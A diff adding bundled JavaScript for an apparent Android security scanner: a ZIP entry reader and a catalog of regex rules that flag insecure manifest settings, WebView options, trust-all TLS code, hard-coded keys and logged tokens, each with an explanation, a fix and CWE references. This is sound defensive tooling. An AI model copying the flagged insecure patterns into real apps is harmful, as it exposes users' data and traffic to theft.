+  const entries = [];
+  for (let n = 0; n < count2 && p + 46 <= buf.length; n++) {
+    if (buf.readUInt32LE(p) !== 33639248) break;
+    const method = buf.readUInt16LE(p + 10);
+    const compressed = buf.readUInt32LE(p + 20);
+    const size = buf.readUInt32LE(p + 24);
+    const nameLen = buf.readUInt16LE(p + 28);
+    const extraLen = buf.readUInt16LE(p + 30);
+    const commentLen = buf.readUInt16LE(p + 32);
+    const local = buf.readUInt32LE(p + 42);
+    const name = buf.toString("utf8", p + 46, p + 46 + nameLen);
+    p += 46 + nameLen + extraLen + commentLen;
+    entries.push({
+      name,
+      size,
+      read: () => {
+        if (size > 64 * 1024 * 1024 || local + 30 > buf.length) return null;
+        const start = local + 30 + buf.readUInt16LE(local + 26) + buf.readUInt16LE(local + 28);
+        const raw = buf.subarray(start, start + compressed);
+        try {
+          return method === 0 ? raw : method === 8 ? (0, import_node_zlib.inflateRawSync)(raw) : null;
+        } catch {
+          return null;
+        }
+      }
+    });
+  }
+  return entries;
+}
+
+// src/security/rule.ts
+function rule(id, severity, platform, files, match, title, why, fix, refs, extra = {}) {
+  return { id, severity, platform, files, match, title, why, fix, refs, ...extra };
+}
+var F = {
+  kotlinJava: /\.(kt|kts|java)$/,
+  kotlin: /\.kt$/,
+  manifest: /AndroidManifest\.xml$/,
+  gradle: /\.gradle(\.kts)?$/,
+  androidXml: /\/res\/xml\/[^/]+\.xml$/,
+  androidRes: /\/res\/values[^/]*\/[^/]+\.xml$/,
+  proguard: /(proguard|r8)[^/]*\.(pro|txt|cfg)$/,
+  swiftObjc: /\.(swift|m|mm|h)$/,
+  swift: /\.swift$/,
+  plist: /\.plist$/,
+  entitlements: /\.entitlements$/,
+  js: /\.(m?[jt]sx?|cjs|cts|mts|vue|svelte)$/,
+  html: /\.html?$/,
+  py: /\.py$/,
+  go: /\.go$/,
+  cs: /\.cs$/,
+  php: /\.php$/,
+  rb: /\.rb$/,
+  dart: /\.dart$/,
+  c: /\.(c|cc|cpp|cxx|h|hpp|m|mm)$/,
+  anyCode: /\.(kt|kts|java|swift|m|mm|m?[jt]sx?|cjs|vue|svelte|py|go|cs|php|rb|dart|rs|scala|groovy|c|cc|cpp|h)$/,
+  config: /\.(ya?ml|json|properties|toml|ini|conf|cfg|env|xml|plist|xcconfig|gradle|kts|tf|tfvars)$|(^|\/)\.env(\.[\w-]+)?$/,
+  text: /\.(kt|kts|java|swift|m|mm|h|m?[jt]sx?|cjs|vue|svelte|py|go|cs|php|rb|dart|rs|scala|groovy|c|cc|cpp|ya?ml|json|properties|toml|ini|conf|cfg|xml|plist|xcconfig|gradle|tf|tfvars|md|txt|sh|bash|ps1|http|ipynb|html?)$|(^|\/)\.env(\.[\w-]+)?$|(^|\/)Dockerfile[^/]*$/,
+  dockerfile: /(^|\/)Dockerfile[^/]*$|\.dockerfile$/,
+  compose: /(^|\/)(docker-)?compose[^/]*\.ya?ml$/,
+  ghActions: /^\.github\/workflows\/[^/]+\.ya?ml$/,
+  gitlabCi: /(^|\/)\.gitlab-ci\.ya?ml$|^\.gitlab\/ci\/.+\.ya?ml$/,
+  terraform: /\.tf$/,
+  k8s: /(^|\/)(k8s|kubernetes|manifests|helm|charts|deploy)\/.+\.ya?ml$/,
+  packageJson: /(^|\/)package\.json$/
+};
+
+// src/security/catalog/android.ts
+var ANDROID = [
+  // ── Manifest
+  rule("AND-MAN-01", "high", "android", F.manifest, /android:debuggable\s*=\s*"true"/, "App marked debuggable in the manifest", "A debuggable app lets anyone with USB access attach a debugger, run as the app and read its data.", "Remove android:debuggable; let the build type decide (release is never debuggable).", ["CWE-215", "MASVS-RESILIENCE"]),
+  rule("AND-MAN-01", "high", "android", F.gradle, /release\s*\{[^}]*(isDebuggable\s*=\s*true|debuggable\s+true)/, "Release build type is debuggable", "Every release build can be debugged and its private data read with run-as.", "Set isDebuggable = false (the default) for release.", ["CWE-215"]),
+  rule("AND-MAN-02", "medium", "android", F.manifest, /android:allowBackup\s*=\s*"true"/, "App data can be backed up", "adb backup and cloud backup copy tokens, databases and preferences off the device.", 'Set allowBackup="false", or keep it and exclude secrets with dataExtractionRules / fullBackupContent.', ["CWE-530", "MASVS-STORAGE"], { unless: /android:(dataExtractionRules|fullBackupContent)\s*=/ }),
+  rule("AND-MAN-03", "medium", "android", F.androidXml, /<(cloud-backup|device-transfer)[\s\S]*?<include\s+domain="(sharedpref|database|file|root)"\s+path="\."/, "Backup rules include all app data", "Cloud backup and device transfer copy every preference, database or file, tokens included.", "Exclude the token store, databases with private data and key files in data_extraction_rules.xml.", ["MASVS-STORAGE"], { when: /<data-extraction-rules|<full-backup-content/ }),
+  rule("AND-MAN-04", "high", "android", F.manifest, /android:usesCleartextTraffic\s*=\s*"true"/, "Cleartext HTTP allowed app-wide", "Anyone on the same Wi-Fi can read and change the app's HTTP traffic.", "Remove usesCleartextTraffic and allow cleartext only for specific debug hosts in network_security_config.xml.", ["CWE-319", "MASVS-NETWORK"]),
+  rule("AND-MAN-04", "high", "android", F.androidXml, /<base-config[^>]*cleartextTrafficPermitted\s*=\s*"true"/, "Network config allows cleartext for every host", "All HTTP traffic is readable and changeable on the network.", 'Set cleartextTrafficPermitted="false" in base-config; add domain-config exceptions only for hosts that need it.', ["CWE-319"]),
+  rule("AND-MAN-05", "medium", "android", F.manifest, /android:networkSecurityConfig\s*=/, "No network security config", "Without one there is no platform-level cleartext block or pinning, and WebViews are not covered by OkHttp interceptors.", "Add res/xml/network_security_config.xml (cleartext off, optional pin-set) and reference it from <application>.", ["MASVS-NETWORK"], { absent: true, when: /<application[\s>]/ }),
+  rule("AND-MAN-06", "high", "android", F.androidXml, /<certificates\s+src\s*=\s*"user"/, "User-installed CAs trusted", "Any CA the user (or malware, or an MDM) installs can intercept the app's TLS traffic.", "Trust user CAs only inside <debug-overrides>.", ["CWE-295"], { unless: /<debug-overrides>[\s\S]*src\s*=\s*"user"[\s\S]*<\/debug-overrides>/ }),
+  rule("AND-MAN-07", "low", "android", F.gradle, /minSdk(Version)?\s*[=(]?\s*(1\d|2[0-2])\b/, "Very old minSdk", "Below API 23 there are no runtime permissions, weaker TLS defaults and no hardware-backed keystore guarantee.", "Raise minSdk to at least 23 (ideally 26+).", ["MASVS-CODE"]),
+  rule("AND-MAN-08", "medium", "android", F.manifest, /android\.permission\.(READ_SMS|RECEIVE_SMS|READ_CALL_LOG|QUERY_ALL_PACKAGES|MANAGE_EXTERNAL_STORAGE|SYSTEM_ALERT_WINDOW|REQUEST_INSTALL_PACKAGES|READ_PHONE_STATE|BIND_ACCESSIBILITY_SERVICE)"/, "Dangerous permission requested", "Each of these widens what a compromise of the app can reach, and Play reviews them strictly.", "Remove it unless a feature needs it; prefer narrower APIs (SMS Retriever, scoped storage, package visibility queries).", ["MASVS-PRIVACY"]),
+  rule("AND-MAN-09", "medium", "android", F.manifest, /<permission[^>]*android:protectionLevel\s*=\s*"normal"/, "Custom permission with normal protection", "Any installed app can request a normal permission, so it protects nothing.", 'Use protectionLevel="signature".', ["CWE-276"]),
+  rule("AND-MAN-10", "medium", "android", F.manifest, /android:allowTaskReparenting\s*=\s*"true"|android:taskAffinity\s*=\s*"(?!")[^"]+"/, "Task affinity can enable task hijacking", "A malicious app can place its activity in your task (StrandHogg) and phish the user.", 'Use taskAffinity="" on sensitive activities and avoid allowTaskReparenting.', ["CWE-1021"]),
+  rule("AND-MAN-11", "low", "android", F.gradle, /^\s*(implementation|api)\s*\(?\s*["'](com\.github\.chuckerteam\.chucker:library|com\.squareup\.leakcanary:leakcanary-android|com\.facebook\.flipper|com\.facebook\.stetho)(?!-no-op)/m, "Debug tool shipped in every build", "Chucker, Flipper and Stetho in release expose network traffic and app data.", "Use debugImplementation, with the -no-op artifact for release.", ["MASVS-CODE"]),
+  rule("AND-MAN-12", "low", "android", F.manifest, /android:sharedUserId\s*=/, "sharedUserId used", "Apps sharing a user id share all data and permissions; it is deprecated.", "Remove sharedUserId and talk between apps through signature-protected IPC.", ["CWE-266"]),
+  // ── Exported components and IPC
+  rule("AND-IPC-01", "medium", "android", F.manifest, /<(activity|activity-alias)\b(?![^>]*android:permission)[^>]*android:exported\s*=\s*"true"(?![^>]*android\.intent\.action\.MAIN)[^>]*>/, "Exported activity without a permission", "Any app on the device can start it with any extras.", 'Set exported="false" unless other apps must start it; otherwise guard it with a signature permission and validate every extra.', ["CWE-926"]),
+  rule("AND-IPC-02", "high", "android", F.manifest, /<service\b(?![^>]*android:permission)[^>]*android:exported\s*=\s*"true"[^>]*>/, "Exported service without a permission", "Any app can start or bind to it and call what it offers.", 'Set exported="false" or require a signature permission.', ["CWE-926"]),
+  rule("AND-IPC-03", "medium", "android", F.manifest, /<receiver\b(?![^>]*android:permission)[^>]*android:exported\s*=\s*"true"[^>]*>/, "Exported broadcast receiver without a permission", "Any app can send it broadcasts and trigger its work.", 'Set exported="false" or require a permission (system broadcasts need none of yours).', ["CWE-925"], { unless: /com\.google\.firebase|androidx\.work|com\.google\.android\.c2dm/ }),
+  rule("AND-IPC-03", "medium", "android", F.kotlinJava, /registerReceiver\s*\((?![^)]*RECEIVER_(NOT_)?EXPORTED)[^)]*\)/, "Runtime receiver registered without an export flag", "On Android 14+ this crashes; before, the receiver is exported to every app.", "Pass ContextCompat.RECEIVER_NOT_EXPORTED (or RECEIVER_EXPORTED with a permission).", ["CWE-925"]),
+  rule("AND-IPC-04", "high", "android", F.manifest, /<provider\b(?![^>]*android:(readPermission|writePermission|permission))[^>]*android:exported\s*=\s*"true"[^>]*>/, "Exported content provider without permissions", "Any app can read (and maybe write) its data.", 'Set exported="false" and share single files with FileProvider grants.', ["CWE-200"]),
+  rule("AND-IPC-05", "high", "android", F.kotlinJava, /(rawQuery|execSQL|query)\s*\([^)]*(selection|sortOrder|uri\.(getQueryParameter|lastPathSegment))\s*\+/, "Content provider builds SQL from caller input", "A calling app can inject SQL into the selection or sort order.", "Use selectionArgs and SQLiteQueryBuilder.setStrict(true) with a projection map.", ["CWE-89"], { when: /extends\s+ContentProvider|:\s*ContentProvider\(\)/ }),
+  rule("AND-IPC-06", "high", "android", F.kotlinJava, /fun\s+openFile|ParcelFileDescriptor\s+openFile/, "Content provider openFile without path checks", "A crafted URI with ../ can read files outside the shared folder.", "Resolve the canonical path and check it stays under the allowed directory.", ["CWE-22"], { when: /ContentProvider/, unless: /canonical(Path|File)|normalize\(\)/ }),
+  rule("AND-IPC-07", "high", "android", F.kotlinJava, /startActivity(ForResult)?\s*\(\s*(intent\.)?get(Parcelable|Serializable)Extra\s*[(<]/, "Intent redirection", "An exported component that starts an Intent taken from extras lets other apps open your private components.", "Never start intents from extras; or check the target component is yours and not exported-private, and strip URI grant flags.", ["CWE-940"]),
+  rule("AND-IPC-09", "medium", "android", F.kotlinJava, /PendingIntent\.FLAG_MUTABLE/, "Mutable PendingIntent", "Whoever receives a mutable PendingIntent can change its intent and act as your app.", "Use FLAG_IMMUTABLE unless the receiver must fill in the intent (inline reply, bubbles).", ["CWE-927"]),
+  rule("AND-IPC-09", "medium", "android", F.kotlinJava, /PendingIntent\.get(Activity|Service|Broadcast)\s*\([^)]*Intent\s*\(\s*"[\w.]+"\s*\)/, "PendingIntent wraps an implicit intent", "Another app can register for the action and receive your PendingIntent's identity.", "Make the wrapped intent explicit (setClass / setPackage).", ["CWE-927"]),
+  rule("AND-IPC-08", "medium", "android", F.kotlinJava, /sendBroadcast\s*\(\s*Intent\s*\(\s*"[\w.]+"\s*\)(?![^\n]*setPackage)/, "Implicit broadcast", "Any app can register for this action and read the extras.", "Set the package (setPackage) or use a permission; use LocalBroadcast/flows inside the app.", ["CWE-927"]),
+  rule("AND-IPC-12", "medium", "android", F.kotlinJava, /getSerializableExtra\s*\(|readSerializable\s*\(/, "Serializable read from an intent", "Java deserialization of attacker-supplied data can run gadget chains or crash the app.", "Pass Parcelable or plain values; validate types.", ["CWE-502"]),
+  // ── Deep links
+  rule("AND-LNK-01", "high", "android", F.manifest, /<intent-filter(?![^>]*autoVerify\s*=\s*"true")[^>]*>(?:(?!<\/intent-filter>)[\s\S])*android\.intent\.action\.VIEW(?:(?!<\/intent-filter>)[\s\S])*android\.intent\.category\.BROWSABLE(?:(?!<\/intent-filter>)[\s\S])*android:scheme\s*=\s*"https?"(?:(?!<\/intent-filter>)[\s\S])*<\/intent-filter>/, "Web link filter without autoVerify", "Any app can claim the same https links and receive them (with tokens in the path) when the user picks it.", 'Add android:autoVerify="true", publish /.well-known/assetlinks.json, and remove duplicate unverified filters.', ["CWE-939"]),
+  rule("AND-LNK-03", "high", "android", F.manifest, /android:scheme\s*=\s*"(?!https?"|content"|file"|geo"|tel"|mailto")[a-z][\w.+-]*"/, "Custom URL scheme", "Any app can register the same scheme; links carrying OAuth codes, reset tokens or invites can be stolen.", "Use verified https App Links for anything sensitive; use PKCE for OAuth redirects.", ["CWE-939"], { when: /android\.intent\.category\.BROWSABLE/ }),
+  rule("AND-LNK-06", "low", "android", F.manifest, /android:pathPattern\s*=\s*"\/?\.\*"/, "Deep link matches every path", "The app claims paths it does not handle, widening what external links can reach.", "List the paths the app handles (pathPrefix per feature).", []),
+  // ── WebView
+  rule("AND-WEB-01", "high", "android", F.kotlinJava, /addJavascriptInterface\s*\(/, "JavaScript bridge added to a WebView", "Every page the WebView loads, including attacker pages reached via links or redirects, can call the bridge methods.", "Load only allowlisted origins in that WebView, check the origin in each bridge call, or use WebViewCompat.addWebMessageListener with allowed origins.", ["CWE-749"], { unless: /addWebMessageListener|allowedOriginRules/ }),
+  rule("AND-WEB-02", "high", "android", F.kotlinJava, /shouldOverrideUrlLoading[\s\S]{0,300}return\s+false/, "WebView follows every link", "Any navigation (redirects, injected links) stays inside the app's WebView with its bridges and cookies.", "Allow only known hosts in shouldOverrideUrlLoading; open others in the browser.", ["CWE-939"], { unless: /(host|authority)\s*(==|in|\.equals|\.endsWith)|allowedHosts|ALLOWED_HOSTS/ }),
+  rule("AND-WEB-03", "high", "android", F.kotlinJava, /Intent\.parseUri\s*\(/, "intent:// URL parsed from web content", "A page can launch any exported component of any app (or your own private ones) with chosen extras.", "Add Intent.URI_ALLOW_UNSAFE only if needed, clear component/selector, addCategory(BROWSABLE), and only follow browser_fallback_url to https allowlisted hosts.", ["CWE-470"]),
+  rule("AND-WEB-04", "high", "android", F.kotlinJava, /(setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs)\s*\(\s*true|allow(File|Universal)AccessFromFileURLs\s*=\s*true/, "WebView file URLs can read other files", "A file:// page (or injected HTML) can read app files and send them anywhere.", "Leave these false; load local content with WebViewAssetLoader over https://appassets.androidplatform.net.", ["CWE-200"]),
+  rule("AND-WEB-04", "medium", "android", F.kotlinJava, /(setAllowFileAccess\s*\(\s*true|allowFileAccess\s*=\s*true)/, "WebView file access enabled", "Pages can load file:// URLs, which with any XSS exposes app files.", "Set allowFileAccess = false and use WebViewAssetLoader.", ["CWE-200"]),
+  rule("AND-WEB-05", "medium", "android", F.kotlinJava, /(setAllowContentAccess\s*\(\s*true|allowContentAccess\s*=\s*true)/, "WebView content:// access enabled", "Pages can read content providers the app can reach.", "Set allowContentAccess = false unless a page needs it.", []),
+  rule("AND-WEB-06", "medium", "android", F.kotlinJava, /MIXED_CONTENT_ALWAYS_ALLOW/, "WebView allows mixed content", "HTTP scripts on HTTPS pages can be replaced by anyone on the network.", "Use MIXED_CONTENT_NEVER_ALLOW.", ["CWE-319"]),
+  rule("AND-WEB-07", "critical", "android", F.kotlinJava, /onReceivedSslError[\s\S]{0,300}\.proceed\s*\(\s*\)/, "WebView ignores TLS errors", "Any network attacker can serve fake pages and read everything the WebView sends.", "Call handler.cancel(); never proceed() on SSL errors.", ["CWE-295"]),
+  rule("AND-WEB-08", "high", "android", F.kotlinJava, /(evaluateJavascript\s*\(\s*"[^"]*"\s*\+|evaluateJavascript\s*\(\s*"[^"]*\$\{?\w|loadUrl\s*\(\s*"javascript:[^"]*"\s*\+|loadUrl\s*\(\s*"javascript:[^"]*\$)/, "JavaScript built from strings", "Untrusted data in the script string runs as code in the page (XSS with bridge access).", "Pass data as JSON via postWebMessage, or JSON-encode it (JSONObject.quote) before building the script.", ["CWE-79"]),
+  rule("AND-WEB-09", "medium", "android", F.kotlinJava, /setWebContentsDebuggingEnabled\s*\(\s*true\s*\)/, "WebView debugging always on", "chrome://inspect can read and drive the WebView on any device, release builds included.", "Gate it: setWebContentsDebuggingEnabled(BuildConfig.DEBUG).", ["CWE-489"]),
+  rule("AND-WEB-11", "low", "android", F.manifest, /android\.webkit\.WebView\.EnableSafeBrowsing"\s+android:value\s*=\s*"false"/, "Safe Browsing turned off for WebViews", "Users get no warning on known phishing and malware pages.", "Remove the meta-data (it is on by default).", []),
+  // ── Storage
+  rule("AND-STO-01", "critical", "android", F.kotlinJava, /(putString|stringPreferencesKey|edit\s*\{[^}]*\[)\s*\(?\s*["']?\w*(access_?token|refresh_?token|auth_?token|jwt|session_?id|password)\w*["']?/i, "Token or password in plain preferences", "SharedPreferences and DataStore are plain files: a backup, a rooted device or a forensic image reads them.", "Store tokens with EncryptedSharedPreferences / Tink with a Keystore key; never store passwords.", ["CWE-312", "CWE-922"], { unless: /EncryptedSharedPreferences|EncryptedFile|Tink|Aead|KeysetHandle/ }),
+  rule("AND-STO-03", "high", "android", F.kotlinJava, /Room\.databaseBuilder\s*\(/, "Room database not encrypted", "The database file is readable from backups, rooted devices and forensic images.", "If it holds personal data, messages or tokens, encrypt it with SQLCipher (openHelperFactory(SupportOpenHelperFactory(passphrase))) and keep the passphrase in the Keystore.", ["CWE-312"], { unless: /openHelperFactory|SupportFactory|SQLCipher|net\.zetetic/ }),
+  rule("AND-STO-04", "high", "android", F.kotlinJava, /getExternalStorageDirectory\s*\(|getExternalStoragePublicDirectory\s*\(|Environment\.DIRECTORY_(DOWNLOADS|DOCUMENTS)/, "Data written to shared storage", "Files in shared storage are readable by other apps and the user's PC.", "Keep private data in filesDir/cacheDir; use MediaStore only for files meant to be shared.", ["CWE-922"]),
+  rule("AND-STO-05", "high", "android", F.kotlinJava, /MODE_WORLD_(READABLE|WRITEABLE)|setReadable\s*\(\s*true\s*,\s*false\s*\)|setWritable\s*\(\s*true\s*,\s*false\s*\)/, "World-readable or writable file", "Every app on the device can read or change it.", "Use MODE_PRIVATE and share files through FileProvider.", ["CWE-276"]),
+  rule("AND-STO-07", "medium", "android", F.androidXml, /<(root-path|external-path|cache-path|files-path|external-files-path)[^>]*path\s*=\s*"(\.|\/)?"/, "FileProvider shares a whole directory", "A granted URI can be rewritten to reach any file in that directory (or the whole device for root-path).", 'Share a dedicated subfolder (path="shared/") and never root-path.', ["CWE-200"]),
+  rule("AND-STO-07", "high", "android", F.androidXml, /<root-path\b/, "FileProvider root-path", "Lets granted URIs address any file on the device the app can read.", "Remove root-path; share specific subfolders.", ["CWE-200"]),
+  rule("AND-STO-09", "low", "android", F.kotlinJava, /setPrimaryClip\s*\(\s*ClipData\.newPlainText\s*\([^)]*(token|password|otp|code|secret|key)/i, "Sensitive value copied to the clipboard", "Other apps and keyboards can read the clipboard.", "Avoid copying secrets; if needed, mark ClipDescription.EXTRA_IS_SENSITIVE (Android 13+) and clear it after a short time.", ["CWE-200"], { unless: /EXTRA_IS_SENSITIVE/ }),
+  // ── Cryptography
+  rule("AND-CRY-01", "critical", "android", F.kotlinJava, /SecretKeySpec\s*\(\s*("[^"]+"|\w+_KEY|BuildConfig\.\w+)\.(toByteArray|getBytes)/, "Hard-coded encryption key", "The key ships in the APK; anyone can extract it and decrypt what it protects.", "Generate keys in the Android Keystore (KeyGenParameterSpec) and never ship key material.", ["CWE-321"]),
+  rule("AND-CRY-02", "critical", "android", F.kotlinJava, /IvParameterSpec\s*\(\s*(ByteArray\s*\(\s*\d+\s*\)|new\s+byte\s*\[\s*\d+\s*\]|"[^"]*"\.(toByteArray|getBytes)|\w*(KEY|IV)\w*\.(toByteArray|getBytes))/, "Static or zero IV", "A fixed IV makes the same plaintext encrypt to the same ciphertext and breaks CBC/GCM security.", "Generate a random IV per encryption (SecureRandom or let the Cipher choose) and store it with the ciphertext.", ["CWE-329"]),
+  rule("AND-CRY-03", "high", "android", F.kotlinJava, /Cipher\.getInstance\s*\(\s*"(AES|DES|DESede)(\/ECB\/[^"]*)?"\s*\)/, "ECB mode (or no mode) for encryption", "ECB leaks patterns of the plaintext and has no integrity.", "Use AES/GCM/NoPadding with a random 12-byte IV.", ["CWE-327"]),
+  rule("AND-CRY-04", "high", "android", F.kotlinJava, /Cipher\.getInstance\s*\(\s*"(DES|DESede|RC4|ARCFOUR|Blowfish)/, "Weak cipher", "DES, 3DES, RC4 and Blowfish are broken or too weak.", "Use AES-GCM (or ChaCha20-Poly1305).", ["CWE-327"]),
+  rule("AND-CRY-04", "medium", "android", F.kotlinJava, /MessageDigest\.getInstance\s*\(\s*"(MD5|SHA-?1)"\s*\)/, "MD5 or SHA-1 hash", "MD5/SHA-1 collisions are practical; unsafe for signatures, integrity or passwords.", "Use SHA-256 for integrity; for passwords a slow KDF on the server.", ["CWE-328"]),
+  rule("AND-CRY-05", "high", "android", F.kotlinJava, /(java\.util\.Random\s*\(|kotlin\.random\.Random\b|\bRandom\s*\(\s*\)\.next|Math\.random\s*\()[\s\S]{0,200}(token|nonce|iv|salt|key|otp|password|secret)/i, "Predictable random for a security value", "java.util.Random and kotlin.random are predictable; tokens and IVs made from them can be guessed.", "Use java.security.SecureRandom.", ["CWE-338"]),
+  rule("AND-CRY-07", "high", "android", F.kotlinJava, /PBEKeySpec\s*\([^)]*,\s*([1-9]\d{0,3})\s*,/, "Weak key derivation (low PBKDF2 iterations)", "A low iteration count makes brute-forcing the password fast.", "Use at least 210,000 PBKDF2-SHA256 iterations, or Argon2.", ["CWE-916"]),
+  rule("AND-CRY-08", "medium", "android", F.gradle, /com\.madgag\.spongycastle|org\.bouncycastle:bc\w+-jdk1[45]on:1\.([0-5]\d|6[0-9])\b/, "Outdated Bouncy/SpongyCastle", "SpongyCastle is unmaintained and old Bouncy Castle versions have known CVEs.", "Move to org.bouncycastle:bcprov-jdk18on (current) or platform crypto.", ["CWE-1104"]),
+  rule("AND-CRY-09", "high", "android", F.kotlinJava, /Mac\.getInstance\s*\(\s*"Hmac\w+"\s*\)[\s\S]{0,400}(BuildConfig\.\w+|"[A-Za-z0-9+/=]{16,}")/, "Request signing with a key shipped in the app", "A signing key in the APK lets anyone forge signed requests; it is not a security control.", "Sign on the server, or use Play Integrity / App Attest tokens that the server verifies.", ["CWE-321", "CWE-345"]),
+  rule("AND-CRY-10", "medium", "android", F.kotlinJava, /\.authenticate\s*\(\s*(promptInfo|info|\w*[Pp]rompt\w*)\s*\)/, "Biometric prompt not bound to a key", "Without a CryptoObject the result is a boolean that hooking tools flip.", "Pass a CryptoObject backed by a Keystore key with setUserAuthenticationRequired(true).", ["MASVS-AUTH"], { when: /BiometricPrompt/, unless: /CryptoObject/ }),
+  // ── Network
+  rule("AND-NET-01", "critical", "android", F.kotlinJava, /(override\s+fun|public\s+void)\s+checkServerTrusted\s*\([^)]*\)\s*(:\s*Unit\s*)?\{\s*(\/\/[^\n]*\s*)?\}/, "TrustManager that trusts every certificate", "Any network attacker can impersonate your servers and read all traffic.", "Delete the custom TrustManager; use the platform default (and pinning if needed).", ["CWE-295"]),
+  rule("AND-NET-02", "critical", "android", F.kotlinJava, /hostnameVerifier\s*\{\s*_\s*,\s*_\s*->\s*true\s*\}|HostnameVerifier\s*\{\s*_\s*,\s*_\s*->\s*true|ALLOW_ALL_HOSTNAME_VERIFIER|NoopHostnameVerifier|verify\s*\([^)]*\)\s*\{\s*return\s+true/, "Hostname verification turned off", "A valid certificate for any site is accepted for your API.", "Remove the custom HostnameVerifier.", ["CWE-297"]),
+  rule("AND-NET-03", "medium", "android", F.kotlinJava, /OkHttpClient\.Builder\s*\(\s*\)/, "No certificate pinning", "With a user or rogue CA installed, auth and payment traffic can be intercepted.", "Pin the API's public key with CertificatePinner or <pin-set> in network_security_config.xml, with a backup pin.", ["MASVS-NETWORK"], { unless: /CertificatePinner|certificatePinner/ }),
+  rule("AND-NET-04", "medium", "android", F.androidXml, /<pin-set(?![^>]*expiration)[^>]*>(?:(?!<\/pin-set>)[\s\S])*<\/pin-set>/, "Pin set without expiration", "If the certificate rotates unexpectedly, every installed app loses its connection until updated.", 'Add expiration="YYYY-MM-DD" and at least one backup pin.', []),
+  rule("AND-NET-05", "medium", "android", /\.(kt|java|gradle|kts|xml|properties)$/, /["']http:\/\/(?!localhost|127\.0\.0\.1|10\.0\.2\.2|schemas\.android\.com|www\.w3\.org|ns\.adobe\.com|xmlpull\.org|apache\.org|maven\.apache\.org|xml\.org)[\w.-]+/, "Plain HTTP endpoint", "Traffic to this URL can be read and changed on the network.", "Use https.", ["CWE-319"]),
+  rule("AND-NET-06", "medium", "android", F.kotlinJava, /(addQueryParameter|appendQueryParameter|@Query)\s*\(\s*"(api_?key|apikey|client_secret|secret|token|access_token|key)"/i, "Secret sent in the URL", "Query strings land in server, proxy and analytics logs.", "Send it in a header, or better, proxy the third-party API through your backend.", ["CWE-598"]),
+  rule("AND-NET-07", "high", "android", F.kotlinJava, /HttpLoggingInterceptor\.Level\.(BODY|HEADERS)/, "HTTP bodies or headers logged", "Tokens, passwords and personal data end up in logcat and crash logs.", "Log only in debug builds (if (BuildConfig.DEBUG)) and redact Authorization/Cookie headers.", ["CWE-532"], { unless: /BuildConfig\.DEBUG|redactHeader/ }),
+  // ── Auth
+  rule("AND-AUT-04", "high", "android", F.kotlinJava, /(loadUrl|launchUrl)\s*\([^)]*(oauth|authorize|\/auth\?|response_type=)/i, "OAuth login in a WebView or without PKCE", "Embedded-WebView OAuth exposes credentials to the app and is blocked by Google; without PKCE the code can be stolen.", "Use AppAuth with Custom Tabs and PKCE.", ["RFC 8252"], { unless: /code_challenge|codeVerifier|AuthorizationService/ }),
+  // ── Privacy and UI
+  rule("AND-PRV-01", "low", "android", F.kotlinJava, /class\s+\w*(Login|SignIn|Password|Otp|Pin|Payment|Card|Wallet)\w*(Activity|Fragment|Screen)\b/, "Sensitive screen without FLAG_SECURE", "Screenshots, screen recording and the recents thumbnail capture it.", "Set WindowManager.LayoutParams.FLAG_SECURE on sensitive screens.", ["MASVS-PLATFORM"], { unless: /FLAG_SECURE/ }),
+  rule("AND-PRV-02", "low", "android", F.kotlinJava, /class\s+\w*(Payment|Confirm|Permission|Transfer)\w*(Activity|Fragment)\b/, "Sensitive action without tapjacking protection", "An overlay app can trick the user into tapping the button.", "Set filterTouchesWhenObscured on sensitive buttons or setHideOverlayWindows(true).", ["CWE-1021"], { unless: /filterTouchesWhenObscured|setHideOverlayWindows/ }),
+  rule("AND-PRV-03", "low", "android", F.kotlinJava, /VISIBILITY_PUBLIC/, "Notification content public on the lock screen", "OTPs and messages show to anyone holding the phone.", "Use VISIBILITY_PRIVATE with a public version that hides the content.", ["CWE-200"]),
+  rule("AND-PRV-04", "low", "android", F.kotlinJava, /getDeviceId\s*\(|getImei\s*\(|getSubscriberId\s*\(|getMacAddress\s*\(/, "Hardware identifier read", "Non-resettable ids track users across apps and resets and need special permission.", "Use an app-scoped random id.", ["MASVS-PRIVACY"]),
+  // ── Logging
+  rule("AND-LOG-01", "medium", "android", F.kotlinJava, /\b(Log\.[vdiwe]|Timber\.[vdiwe]|println)\s*\([^)\n]*\b(password|passwd|token|secret|otp|authorization|cookie|credential)/i, "Secret logged", "Logcat is readable over USB and ends up in bug reports and crash tools.", "Remove the log or log only that the value exists; strip debug logs in release.", ["CWE-532"]),
+  rule("AND-LOG-03", "low", "android", F.proguard, /-assumenosideeffects\s+class\s+android\.util\.Log/, "Debug logs not stripped in release", "Verbose and debug logs stay in the release build.", "Add -assumenosideeffects class android.util.Log { public static *** d(...); public static *** v(...); } (or gate your logger).", [], { absent: true }),
+  // ── Build
+  rule("AND-BLD-01", "low", "android", F.gradle, /release\s*\{[^}]*(isMinifyEnabled\s*=\s*false|minifyEnabled\s+false)/, "Release build not minified", "Unshrunk, unobfuscated code is easier to reverse and patch.", "Enable isMinifyEnabled = true with R8 rules.", ["MASVS-RESILIENCE"]),
+  rule("AND-BLD-01", "low", "android", F.proguard, /^\s*-dontobfuscate/m, "Obfuscation turned off", "Class and method names stay readable in the shipped app.", "Remove -dontobfuscate from release rules.", ["MASVS-RESILIENCE"]),
+  rule("AND-BLD-02", "high", "android", F.gradle, /buildConfigField\s*\(?\s*["']String["']\s*,\s*["']\w*(SECRET|PRIVATE|PASSWORD|HMAC|AES|SIGNING|ENCRYPTION)\w*["']/i, "Secret compiled into BuildConfig", "BuildConfig strings are in the dex string pool, readable with jadx even after obfuscation.", "Keep secrets on the server; issue short-lived tokens to the app.", ["CWE-798"]),
+  rule("AND-BLD-02", "medium", "android", /secrets(\.defaults)?\.properties$/, /^(?!ignore\.)\w*(SECRET|PRIVATE|PASSWORD|HMAC|AES|TOKEN)\w*\s*=/im, "Secret emitted to BuildConfig by the secrets plugin", "Every key in secrets.properties without the `ignore.` prefix becomes a BuildConfig field shipped in the APK.", "Prefix build-only keys with `ignore.` and move app secrets server-side.", ["CWE-798"]),
+  rule("AND-BLD-05", "high", "android", F.gradle, /(storePassword|keyPassword)\s*[=(]?\s*["'][^"'$]{4,}["']/, "Signing password in a build file", "With the keystore, this lets anyone sign apps as you.", "Read it from an environment variable or CI secret.", ["CWE-798"], { secret: true }),
+  rule("AND-BLD-06", "info", "android", F.gradle, /debugSymbolLevel\s*[=(]?\s*["']FULL["']/, "Full native debug symbols in the bundle", "Full symbols make the native code much easier to reverse.", "Use SYMBOL_TABLE, or upload symbols to Play/Crashlytics only.", []),
